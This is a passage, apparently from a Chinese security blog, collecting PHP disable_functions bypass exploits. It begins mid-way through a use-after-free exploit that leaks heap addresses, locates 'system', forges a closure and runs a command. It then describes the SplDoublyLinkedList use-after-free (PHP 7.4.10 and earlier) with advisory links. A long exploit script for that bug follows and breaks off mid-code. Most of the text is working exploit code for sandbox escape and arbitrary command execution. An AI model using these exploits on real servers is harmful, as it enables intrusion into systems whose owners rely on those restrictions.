class="hljs-variable">$funcs</span>)) &#123;<br>            <span class="hljs-keyword">return</span> [<span class="hljs-variable">$name</span>, <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-variable">$prefix</span>) . <span class="hljs-title function_ invoke__">str_pad</span>(<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$addr</span>), <span class="hljs-number">8</span>, <span class="hljs-string">&quot;0&quot;</span>, STR_PAD_LEFT),<br>                <span class="hljs-variable">$std_object_handlers</span>, <span class="hljs-variable">$NumPrefix</span>];<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getSystem</span>(<span class="hljs-params"><span class="hljs-variable">$unknown_func</span></span>) </span>&#123;<br>    <span class="hljs-variable">$unknown_addr</span> = <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$unknown_func</span>[<span class="hljs-number">1</span>]);<br>    <span class="hljs-variable">$prefix</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$unknown_addr</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>);<br>    <span class="hljs-variable">$unknown_addr</span> = <span class="hljs-title function_ invoke__">hexdec</span>(<span class="hljs-variable">$unknown_func</span>[<span class="hljs-number">1</span>]);<br>    <span class="hljs-variable">$start</span> = <span class="hljs-variable">$unknown_addr</span> &amp; <span class="hljs-number">0x00000000ffffffff</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>;<span class="hljs-variable">$i</span> &lt; <span class="hljs-number">0x800</span>;<span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$addr</span> = <span class="hljs-variable">$start</span> - <span class="hljs-number">0x20</span> * <span class="hljs-variable">$i</span>;<br>        <span class="hljs-variable">$name_addr</span> = <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">leak2</span>(<span class="hljs-variable">$prefix</span> . <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-title function_ invoke__">str_pad</span>(<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$addr</span> - <span class="hljs-number">0x10</span>), <span class="hljs-number">8</span>,<br>                <span class="hljs-string">&quot;0&quot;</span>, STR_PAD_LEFT))));<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">hexdec</span>(<span class="hljs-variable">$name_addr</span>) &gt; <span class="hljs-variable">$unknown_func</span>[<span class="hljs-number">2</span>] || <span class="hljs-title function_ invoke__">hexdec</span>(<span class="hljs-variable">$name_addr</span>) &lt;<br>            <span class="hljs-variable">$unknown_func</span>[<span class="hljs-number">3</span>]) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>        <span class="hljs-variable">$name_addr</span> = <span class="hljs-title function_ invoke__">str_pad</span>(<span class="hljs-variable">$name_addr</span>, <span class="hljs-number">16</span>, <span class="hljs-string">&quot;0&quot;</span>, STR_PAD_LEFT);<br>        <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-title function_ invoke__">leak2</span>(<span class="hljs-variable">$prefix</span> . <span class="hljs-title function_ invoke__">s2b</span>(<span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$name_addr</span>), <span class="hljs-number">0x00</span>)));<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-variable">$name</span>, <span class="hljs-string">&quot;system&quot;</span>)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">leak2</span>(<span class="hljs-variable">$prefix</span> . <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-title function_ invoke__">str_pad</span>(<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$addr</span> - <span class="hljs-number">0x10</span> + <span class="hljs-number">0x08</span>), <span class="hljs-number">8</span>,<br>                    <span class="hljs-string">&quot;0&quot;</span>, STR_PAD_LEFT))));<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>;<span class="hljs-variable">$i</span> &lt; <span class="hljs-number">0x800</span>;<span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$addr</span> = <span class="hljs-variable">$start</span> + <span class="hljs-number">0x20</span> * <span class="hljs-variable">$i</span>;<br>        <span class="hljs-variable">$name_addr</span> = <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">leak2</span>(<span class="hljs-variable">$prefix</span> . <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-title function_ invoke__">str_pad</span>(<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$addr</span> - <span class="hljs-number">0x10</span>), <span class="hljs-number">8</span>,<br>                <span class="hljs-string">&quot;0&quot;</span>, STR_PAD_LEFT))));<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">hexdec</span>(<span class="hljs-variable">$name_addr</span>) &gt; <span class="hljs-variable">$unknown_func</span>[<span class="hljs-number">2</span>] || <span class="hljs-title function_ invoke__">hexdec</span>(<span class="hljs-variable">$name_addr</span>) &lt;<br>            <span class="hljs-variable">$unknown_func</span>[<span class="hljs-number">3</span>]) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>        <span class="hljs-variable">$name_addr</span> = <span class="hljs-title function_ invoke__">str_pad</span>(<span class="hljs-variable">$name_addr</span>, <span class="hljs-number">16</span>, <span class="hljs-string">&quot;0&quot;</span>, STR_PAD_LEFT);<br>        <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-title function_ invoke__">leak2</span>(<span class="hljs-variable">$prefix</span> . <span class="hljs-title function_ invoke__">s2b</span>(<span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$name_addr</span>), <span class="hljs-number">0x00</span>)));<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-variable">$name</span>, <span class="hljs-string">&quot;system&quot;</span>)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">leak2</span>(<span class="hljs-variable">$prefix</span> . <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-title function_ invoke__">str_pad</span>(<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$addr</span> - <span class="hljs-number">0x10</span> + <span class="hljs-number">0x08</span>), <span class="hljs-number">8</span>,<br>                    <span class="hljs-string">&quot;0&quot;</span>, STR_PAD_LEFT))));<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$rp</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReflectionProperty</span>(<span class="hljs-title class_">Test</span>::<span class="hljs-variable language_">class</span>, <span class="hljs-string">&#x27;prop&#x27;</span>);<br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>;<br><span class="hljs-variable">$test</span> -&gt; prop = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HelperHelperHelperHelperHelperHelperHelper</span>;<br><span class="hljs-variable">$abc</span> = <span class="hljs-variable">$rp</span> -&gt; <span class="hljs-title function_ invoke__">getType</span>() -&gt; <span class="hljs-title function_ invoke__">getName</span>();<br><span class="hljs-variable">$helper</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HelperHelperHelperHelperHelperHelperHelper</span>();<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$abc</span>) &lt; <span class="hljs-number">1000</span>) &#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;UAF Failed!&quot;</span>);<br>&#125;<br><span class="hljs-variable">$helper</span> -&gt; a = <span class="hljs-variable">$helper</span>;<br><span class="hljs-variable">$php_heap</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-number">0x10</span>);<br><span class="hljs-variable">$helper</span> -&gt; a = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"><span class="hljs-variable">$x</span></span>) </span>&#123;&#125;;<br><span class="hljs-variable">$std_object_handlers</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-number">0x0</span>);<br><span class="hljs-variable">$prefix</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$php_heap</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Helper Object Address: &quot;</span> . <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-variable">$php_heap</span>) . <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;std_object_handlers Address: &quot;</span> . <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-variable">$std_object_handlers</span>) . <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-variable">$closure_object</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-number">0x10</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Closure Object: &quot;</span> . <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-variable">$closure_object</span>) . <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-title function_ invoke__">write</span>(<span class="hljs-number">0x28</span>, <span class="hljs-string">&quot;\x06&quot;</span>);<br><span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$unknown_func</span> = <span class="hljs-title function_ invoke__">get_basic_funcs</span>(<span class="hljs-variable">$std_object_handlers</span>))) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t determine funcs address&quot;</span>);<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Find func&#x27;s adress: &quot;</span> . <span class="hljs-variable">$unknown_func</span>[<span class="hljs-number">1</span>] . <span class="hljs-string">&quot; -&gt; &quot;</span> . <span class="hljs-variable">$unknown_func</span>[<span class="hljs-number">0</span>] .<br>    <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$system_address</span> = <span class="hljs-title function_ invoke__">getSystem</span>(<span class="hljs-variable">$unknown_func</span>))) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t determine system address&quot;</span>);<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Find system&#x27;s handler: &quot;</span> . <span class="hljs-variable">$system_address</span> . <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>;<span class="hljs-variable">$i</span> &lt; (<span class="hljs-number">0x130</span> / <span class="hljs-number">0x08</span>);<span class="hljs-variable">$i</span>++) &#123;<br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-number">0x308</span> + <span class="hljs-number">0x08</span> * (<span class="hljs-variable">$i</span> + <span class="hljs-number">1</span>), <span class="hljs-title function_ invoke__">leak2</span>(<span class="hljs-variable">$prefix</span> . <span class="hljs-title function_ invoke__">s2b</span>(<span class="hljs-variable">$closure_object</span>, <span class="hljs-number">0x08</span> *<br>            <span class="hljs-variable">$i</span>)));<br>&#125;<br><span class="hljs-variable">$abc</span>[<span class="hljs-number">0x308</span> + <span class="hljs-number">0x40</span>] = <span class="hljs-string">&quot;\x01&quot;</span>;<br><span class="hljs-title function_ invoke__">write</span>(<span class="hljs-number">0x308</span> + <span class="hljs-number">0x70</span>, <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$system_address</span>));<br><span class="hljs-title function_ invoke__">write</span>(<span class="hljs-number">0x10</span>, <span class="hljs-variable">$prefix</span> . <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-title function_ invoke__">s2n</span>(<span class="hljs-variable">$php_heap</span>) + <span class="hljs-number">0x18</span> + <span class="hljs-number">0x308</span> + <span class="hljs-number">0x08</span>)));<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Fake Closure Object Address: &quot;</span> . <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-variable">$prefix</span> .<br>        <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-title function_ invoke__">str_pad</span>(<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-title function_ invoke__">s2n</span>(<span class="hljs-variable">$php_heap</span>) + <span class="hljs-number">0x18</span> + <span class="hljs-number">0x308</span> + <span class="hljs-number">0x08</span>), <span class="hljs-number">8</span>, <span class="hljs-string">&quot;0&quot;</span>,<br>            STR_PAD_LEFT))) . <span class="hljs-string">&quot;\n&quot;</span>;<br>(<span class="hljs-variable">$helper</span> -&gt; a)(<span class="hljs-string">&quot;id&quot;</span>);<br></code></pre></td></tr></table></figure><h2 id="php7-SplDoublyLinkedList-UAF"><a href="#php7-SplDoublyLinkedList-UAF" class="headerlink" title="php7_SplDoublyLinkedList UAF"></a>php7_SplDoublyLinkedList UAF</h2><p><strong>利用条件</strong></p><ul><li>PHP v7.4.10及其之前版本</li><li>PHP v8.0（Alpha）</li></ul><blockquote><p>如果限制了 openbase_dir ，则需要进行爆破，而且爆破还会导致进程崩溃</p></blockquote><p><strong>原理</strong></p><p>PHP的SplDoublyLinkedList双向链表库中存在一个用后释放漏洞，该漏洞将允许攻击者通过运行PHP代码来转义disable_functions限制函数。在该漏洞的帮助下，远程攻击者将能够实现PHP沙箱逃逸，并执行任意代码。更准确地来说，成功利用该漏洞后，攻击者将能够绕过PHP的某些限制，例如disable_functions和safe_mode等等</p><p><a href="https://xz.aliyun.com/t/8355">通过UAF bypass PHP disabled functions</a><br><a href="https://www.freebuf.com/articles/web/251017.html">PHP SplDoublyLinkedList中的用后释放漏洞分析</a><br><a href="https://bugs.php.net/bug.php?id=80111">PHP SplDoublyLinkedList::offsetUnset UAF Sandbox Escape</a></p><p><strong>exp</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;T&quot;</span>, <span class="hljs-number">120</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">i2s</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$a</span>, <span class="hljs-variable">$p</span>, <span class="hljs-variable">$i</span>, <span class="hljs-variable">$x</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$j</span> = <span class="hljs-number">0</span>;<span class="hljs-variable">$j</span> &lt; <span class="hljs-variable">$x</span>;<span class="hljs-variable">$j</span>++) &#123;<br>        <span class="hljs-variable">$a</span>[<span class="hljs-variable">$p</span> + <span class="hljs-variable">$j</span>] = <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$i</span> &amp; <span class="hljs-number">0xff</span>);<br>        <span class="hljs-variable">$i</span> &gt;&gt;= <span class="hljs-number">8</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">s2i</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$x</span> = <span class="hljs-number">0</span>;<span class="hljs-variable">$x</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$s</span>);<span class="hljs-variable">$x</span>++) &#123;<br>        <span class="hljs-variable">$result</span> &lt;&lt;= <span class="hljs-number">8</span>;<br>        <span class="hljs-variable">$result</span> |= <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$x</span>]);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$result</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">leak</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$a</span>, <span class="hljs-variable">$address</span></span>) </span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$s</span>;<br>    <span class="hljs-title function_ invoke__">i2s</span>(<span class="hljs-variable">$a</span>, <span class="hljs-number">0x00</span>, <span class="hljs-variable">$address</span> - <span class="hljs-number">0x10</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$s</span> -&gt; <span class="hljs-title function_ invoke__">current</span>());<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getPHPChunk</span>(<span class="hljs-params"><span class="hljs-variable">$maps</span></span>) </span>&#123;<br>    <span class="hljs-variable">$pattern</span> = <span class="hljs-string">&#x27;/([0-9a-f]+\-[0-9a-f]+) rw\-p 00000000 00:00 0 /&#x27;</span>;<br>    <span class="hljs-title function_ invoke__">preg_match_all</span>(<span class="hljs-variable">$pattern</span>, <span class="hljs-variable">$maps</span>, <span class="hljs-variable">$match</span>);<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$match</span>[<span class="hljs-number">1</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$value</span>) &#123;<br>        <span class="hljs-keyword">list</span>(<span class="hljs-variable">$start</span>, <span class="hljs-variable">$end</span>) = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-variable">$value</span>);<br>        <span class="hljs-keyword">if</span> ((<span class="hljs-variable">$length</span> = <span class="hljs-title function_ invoke__">s2i</span>(<span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$end</span>)) - <span class="hljs-title function_ invoke__">s2i</span>(<span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$start</span>))) &gt;= <span class="hljs-number">0x200000</span> &amp;&amp; <span class="hljs-variable">$length</span> &lt;= <span class="hljs-number">0x300000</span>) &#123;<br>            <span class="hljs-variable">$address</span> = <span class="hljs-keyword">array</span>(<span class="hljs-title function_ invoke__">s2i</span>(<span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$start</span>)), <span class="hljs-title function_ invoke__">s2i</span>(<span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$end</span>)), <span class="hljs-variable">$length</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[+]PHP Chunk: &quot;</span> . <span class="hljs-variable">$start</span> . <span class="hljs-string">&quot; - &quot;</span> . <span class="hljs-variable">$end</span> . <span class="hljs-string">&quot;, length: 0x&quot;</span> . <span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$length</span>) . <span class="hljs-string">&quot;\n&quot;</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$address</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">bomb1</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$a</span></span>) </span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$a</span>, <span class="hljs-title function_ invoke__">s2i</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;test1&quot;</span>])) === <span class="hljs-number">0x5454545454545454</span>) &#123;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-title function_ invoke__">s2i</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;test1&quot;</span>]) &amp; <span class="hljs-number">0x7ffff0000000</span>);<br>    &#125;<span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;[!]Where is here&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">bomb2</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$a</span></span>) </span>&#123;<br>    <span class="hljs-variable">$start</span> = <span class="hljs-title function_ invoke__">s2i</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;test2&quot;</span>]);<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">getElement</span>(<span class="hljs-variable">$a</span>, <span class="hljs-keyword">array</span>(<span class="hljs-variable">$start</span>, <span class="hljs-variable">$start</span> + <span class="hljs-number">0x200000</span>, <span class="hljs-number">0x200000</span>));<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;[!]Not Found&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getElement</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$a</span>, <span class="hljs-variable">$address</span></span>) </span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$x</span> = <span class="hljs-number">0</span>;<span class="hljs-variable">$x</span> &lt; (<span class="hljs-variable">$address</span>[<span class="hljs-number">2</span>] / <span class="hljs-number">0x1000</span> - <span class="hljs-number">2</span>);<span class="hljs-variable">$x</span>++) &#123;<br>        <span class="hljs-variable">$addr</span> = <span class="hljs-number">0x108</span> + <span class="hljs-variable">$address</span>[<span class="hljs-number">0</span>] + <span class="hljs-number">0x1000</span> * <span class="hljs-variable">$x</span> + <span class="hljs-number">0x1000</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$y</span> = <span class="hljs-number">0</span>;<span class="hljs-variable">$y</span> &lt; <span class="hljs-number">5</span>;<span class="hljs-variable">$y</span>++) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$a</span>, <span class="hljs-variable">$addr</span> + <span class="hljs-variable">$y</span> * <span class="hljs-number">0x08</span>) === <span class="hljs-number">0x1234567812345678</span> &amp;&amp; ((<span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$a</span>, <span class="hljs-variable">$addr</span> + <span class="hljs-variable">$y</span> * <span class="hljs-number">0x08</span> - <span class="hljs-number">0x08</span>) &amp; <span class="hljs-number">0xffffffff</span>) === <span class="hljs-number">0x01</span>))&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[+]SplDoublyLinkedList Element: &quot;</span> . <span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$addr</span> + <span class="hljs-variable">$y</span> * <span class="hljs-number">0x08</span> - <span class="hljs-number">0x18</span>) . <span class="hljs-string">&quot;\n&quot;</span>;<br>                <span class="hljs-keyword">return</span> <span class="hljs-variable">$addr</span> + <span class="hljs-variable">$y</span> * <span class="hljs-number">0x08</span> - <span class="hljs-number">0x18</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getClosureChunk</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$a</span>, <span class="hljs-variable">$address</span></span>) </span>&#123;<br>    <span class="hljs-keyword">do</span> &#123;<br>        <span class="hljs-variable">$address</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$a</span>, <span class="hljs-variable">$address</span>);<br>    &#125;<span class="hljs-keyword">while</span>(<span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$a</span>, <span class="hljs-variable">$address</span>) !== <span class="hljs-number">0x00</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[+]Closure Chunk: &quot;</span> . <span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$address</span>) . <span class="hljs-string">&quot;\n&quot;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$address</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getSystem</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$a</span>, <span class="hljs-variable">$address</span></span>) </span>&#123;<br>    <span class="hljs-variable">$start</span> = <span class="hljs-variable">$address</span> &amp; <span class="hljs-number">0xffffffffffff0000</span>;<br>    <span class="hljs-variable">$lowestAddr</span> = (<span class="hljs-variable">$address</span> &amp; <span class="hljs-number">0x0000fffffff00000</span>) - <span class="hljs-number">0x0000000001000000</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">0x1000</span> * <span class="hljs-number">0x80</span>; <span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$addr</span> = <span class="hljs-variable">$start</span> - <span class="hljs-variable">$i</span> * <span class="hljs-number">0x20</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$addr</span> &lt; <span class="hljs-variable">$lowestAddr</span>) &#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-variable">$nameAddr</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$a</span>, <span class="hljs-variable">$addr</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$nameAddr</span> &gt; <span class="hljs-variable">$address</span> || <span class="hljs-variable">$nameAddr</span> &lt; <span class="hljs-variable">$lowestAddr</span>) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>        <span class="hljs-variable">$name</span> = <span class="hljs-title function_ 